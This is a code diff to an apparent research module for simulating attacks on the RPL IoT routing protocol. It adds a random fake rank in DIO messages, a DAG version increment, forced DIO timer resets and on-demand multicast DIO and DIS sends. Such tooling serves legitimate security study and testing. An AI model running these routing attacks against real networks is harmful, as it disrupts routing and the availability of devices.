@@ -29,6 +29,7 @@
  */
 
 #include "network-attacks.h"
+#include "lib/random.h"
 #include "net/netstack.h"
 #include "net/routing/routing.h"
 #include "net/ipv6/uipbuf.h"
@@ -61,7 +62,40 @@
  *   network_attacks_udp_drop_fwd = true
  * (b) Drop ALL application (UDP) packets (including from this node)
  *   network_attacks_udp_drop = true
+ *
+ * Configuration for fake rank:
+ *   network_attacks_rpl_dio_fake_rank = 256
+ *   network_attacks_rpl_dio_reset = true
+ *
+ * Configuration for random rank:
+ *   network_attacks_rpl_dio_random_rank = true
+ *   network_attacks_rpl_dio_reset = true
+ *
+ * Send multicast DIO once immediately:
+ *   network_attacks_rpl_dio_send = true
+ * Send multicast DIS once immediately:
+ *   network_attacks_rpl_dis_send = true
  */
+
+/*
+ * Reset DIO timers (automatic reset to false)
+ */
+bool network_attacks_rpl_dio_reset;
+
+/*
+ * Send multicast DIO (automatic reset to false)
+ */
+bool network_attacks_rpl_dio_send;
+
+/*
+ * Send multicast DIS (automatic reset to false)
+ */
+bool network_attacks_rpl_dis_send;
+
+/*
+ * Increment RPL DAG version with one (automatic reset to false)
+ */
+bool network_attacks_rpl_dag_version_bump;
 
 /*
  * DIS Flooding Attack - send multicast DIS periodically and after
@@ -90,6 +124,12 @@ bool network_attacks_udp_drop = false;
  * Send fake rate in DIO packets when different from 0.
  */
 uint16_t network_attacks_rpl_dio_fake_rank = 0;
+
+/*
+ * Send a random fake rank within [2*128,10*128] in DIO packets
+ * (only when network_attacks_rpl_dio_fake_rank is 0).
+ */
+bool network_attacks_rpl_dio_random_rank = false;
 
 /*
  * Only accept DIO from parent, ignore DIO from all other neighbors.
@@ -165,6 +205,43 @@ check_config(void *ptr)
   if(network_attacks_rpl_dfa && ctimer_expired(&dfa_timer)) {
     ctimer_set(&dfa_timer, CLOCK_SECOND / 2, dfa, NULL);
   }
+
+  if(network_attacks_rpl_dag_version_bump) {
+    network_attacks_rpl_dag_version_bump = false;
+#if ROUTING_CONF_RPL_LITE
+    RPL_LOLLIPOP_INCREMENT(curr_instance.dag.version);
+    LOG_INFO("Bump DAG version to %u\n", curr_instance.dag.version);
+#elif ROUTING_CONF_RPL_CLASSIC
+    rpl_instance_t *instance;
+    instance = rpl_get_default_instance();
+    if(instance == NULL) {
+      LOG_WARN("No RPL instance - can not bump DAG version\n");
+    } else {
+      RPL_LOLLIPOP_INCREMENT(instance->dag.version);
+      LOG_INFO("Bump DAG version to %u\n", instance->dag.version);
+    }
+#else
+    LOG_WARN("Not using RPL - can not bump DAG version\n");
+#endif
+  }
+
+  if(network_attacks_rpl_dio_reset) {
+    network_attacks_rpl_dio_reset = false;
+    LOG_INFO("Reset DIO timers\n");
+    rpl_timers_dio_reset("network attack request");
+  }
+
+  if(network_attacks_rpl_dio_send) {
+    network_attacks_rpl_dio_send = false;
+    LOG_INFO("Send multicast DIO\n");
+    rpl_icmp6_dio_output(NULL);
+  }
+
+  if(network_attacks_rpl_dis_send) {
+    network_attacks_rpl_dis_send = false;
+    LOG_INFO("Send multicast DIS\n");
+    rpl_icmp6_dis_output(NULL);
+ }
 
   ctimer_restart(&periodic_timer);
 }
@@ -353,8 +430,11 @@ process_dio_output(struct uip_icmp_hdr *hdr)
     /* Unicast */
   }
 
-  if(network_attacks_rpl_dio_fake_rank != 0) {
-    uint16_t new_rank = network_attacks_rpl_dio_fake_rank;
+  uint16_t new_rank = network_attacks_rpl_dio_fake_rank;
+  if(new_rank == 0 && network_attacks_rpl_dio_random_rank) {
+    new_rank = 2 * 128 + (random_rand() % (8 * 128));
+  }
+  if(new_rank != 0) {
     payload = (uint8_t *)(hdr + 1);
     LOG_INFO("sending fake DIO: i: %u ver: %u rank: %u => rank: %u\n",
              payload[0], payload[1],
